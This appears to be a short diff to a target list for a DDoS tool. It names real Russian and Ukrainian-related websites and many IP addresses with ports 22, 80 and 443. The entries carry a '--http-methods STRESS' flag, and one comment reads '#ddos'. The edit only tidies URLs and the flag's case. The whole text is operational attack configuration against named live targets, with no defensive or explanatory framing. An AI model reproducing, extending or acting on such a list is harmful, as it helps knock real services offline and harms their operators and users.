@@ -2,7 +2,7 @@
 
 #zhnec
 
-https://boxberry.ru/ --http-methods stress
+https://boxberry.ru --http-methods STRESS
 
 tcp://130.193.37.150:80 tcp://130.193.37.150:443 tcp://178.154.196.210:22 tcp://178.154.196.210:80 tcp://178.154.196.210:443 
 
@@ -34,7 +34,7 @@ https://sd.boxberry.ru tcp://188.130.235.86:80 tcp://188.130.235.86:443 tcp://13
 #ddos separiv
 
 
-http://www.asna.ru/ http://kiev.wikimapia.org/streets/page/2 --http-methods STRESS 
+http://www.asna.ru http://kiev.wikimapia.org/streets/page/2 --http-methods STRESS 
 
 tcp://185.169.155.178:80 tcp://185.169.155.178:443 tcp://5.200.62.190:80 tcp://5.200.62.190:443
 
